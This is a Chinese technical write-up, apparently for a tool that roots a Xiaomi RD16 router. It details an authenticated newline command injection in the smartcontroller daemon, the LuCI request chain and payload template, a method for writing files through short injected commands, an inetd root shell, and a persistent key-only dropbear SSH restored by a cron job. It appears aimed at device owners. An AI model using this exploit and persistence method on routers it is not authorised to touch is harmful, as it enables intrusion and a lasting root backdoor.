# 技术细节

## 注入点定位

`/usr/sbin/smartcontroller` 处理 `scene_setting` 时把 action.payload（JSON 字符串）里的 `mac`、`wan` 直接替换进：

```
snprintf(buf, "… set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit", mac, wan)
system(buf)
```

`mac` 没有任何转义 → 换行即命令注入。限制是 fortify `snprintf` 输出长度 ≈97 字符，减去模板固定部分后，注入命令 ≤18 字符。

## 调用链

```
POST /cgi-bin/luci/api/xqsystem/login        -> token
POST /cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller
    {"command":"scene_setting","id":0,"launch":{"mode":"home"},
     "action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,
                     "payload":"{\"command\":\"wan_block\",\"mac\":\"AA\n<CMD>\n\"}"}]}
    -> daemon 保存场景并回 id
POST 同上 {"command":"scene_start","id":<id>} -> 执行
```

`payload` 是**字符串形式**的内层 JSON（需要二次转义）。登录 body 逐字段做 form 编码，密码里的 `&`、`+` 才不会截断。

## 为什么直接 telnetd 不行

busybox 里有 `bdata get telnet_en` / `nvram get telnet_en` 检查——裸 `telnetd` 进程秒退、不绑端口。LuCI 的 `set_telnet` 接口又被 `apps.telnet` 特性开关挡住（release 分支不注册）。绕过：inetd 不查 telnet_en，直接给 `/bin/sh`——但它只是**临时调试通道**，落地 SSH 后要移除（见下）。

## 碎片写入（追加式）

每条注入命令 ≤18 字符并把内容**直接追加**到目标文件，因此脚本长度没有上限，也不存在最后一步超长的拼接命令：

- 非空格碎片（≤2 字符）：`echo -n FF>>/tmp/x`（18）
- 含空格的三字符组 `A B`：`echo -n A B>/tmp/0` + `cat /tmp/0>>/tmp/x`（两条 18）——空格由 echo 的 argv 拆分产生
- 行尾碎片：普通 `echo`（`echo A D >>/tmp/x`，17-18）顺带补换行
- 纯数字参数紧跟 `>`/`>>` 会被解释成 fd 重定向（`2>`、`2>>`）——必须 `D >>` 补空格；混合字符（`aa2`）不受此限制（io_number 要求整个词都是数字）
- 行中 `空格+数字`（`A D`）没有 ≤18 字符的合法写法，写入器抛 `ValueError`；`>` 无法出现在脚本内容里

`run_cmd()` 对每条命令做长度与禁用字符硬检查。

## SSH 验证

banner / 端口监听只证明有服务在答，不能证明公钥登录可用。`--privkey` 时用本机 `ssh -i <key> -o BatchMode=yes root@ip id` 实测（返回 `uid=0` 才算过）；没给 `--privkey` 则交互确认后才关 inetd。验证不通过时 :23 保留。

## 防火墙（--allow-cidr）

独立链 `RD16_SSH`（`-N` 建链、`-F` 清链、`ACCEPT CIDR` → `DROP`），`INPUT` 里用 `-I` 置顶跳转规则——无论链里原有哪条通用 ACCEPT，:22 流量都先过这条链。CIDR 由 `ipaddress.ip_network` 校验后才进脚本；不写 `--allow-cidr` 则不加任何规则。

## 持久化模型

- `/etc` = ramfs，每次启动从 squashfs 重建 → 运行期写入全失
- `/etc/crontabs`、`/etc/config` 绑到 sec_cfg ext4 → 持久
- `/data`（UBIFS）→ 持久，放 hostkey / persist.sh / authorized_keys
- `/etc/crontabs/root` 末尾加 `* * * * * sh /data/persist.sh` → 每分钟自愈
- persist.sh 只负责恢复 **dropbear**；inetd 不进看门狗、不拷到 /data

## dropbear（仅密钥）

1. `rm /etc/dropbear/dropbear_rsa_host_key`（0 字节占位文件必须删掉，否则 keygen 报 File exists）
2. `dropbearkey -t rsa -f /data/dropbear_rsa_host_key`（~1 分钟，IPQ5312 上 RSA-2048 慢）
3. `dropbear -s -r /data/dropbear_rsa_host_key` → SSH 仅密钥认证；**禁用 `-B`**（空密码）与密码登录
4. `authorized_keys` 放 `/etc/dropbear/authorized_keys`（运行期有效，persist.sh 每次恢复）
5. 收尾：`pgrep -x inetd` 逐个 kill + `rm /etc/inetd.conf`——先实测 `ssh -i 私钥 root@ip id` 返回 `uid=0` 再执行（banner 可达不算验证通过）

## 其他未走通/未验证

- `nvram set telnet_en=1` / `bdata set telnet_en=1`：命令执行了但 `nvram show`/`bdata show` 里仍为空，疑似 lanap 模式下 nvram 后端不生效——未深究，inetd 路线不需要它
- XMiR-Patcher 所有 LuCI 注入点（arn_switch/start_binding/set_mac_filter/datacenter7/Smartcontroller 老路径/get_icon）：1.0.41 全封
- `set_macfilter_rules` / `set_global_enable`：RD16 未注册对应 API 路由
- `openssl` 在设备上可用（`openssl passwd -1`、`enc -d -base64 -in/-out`），可用来写任意二进制（dropbear hostkey 备选路径）
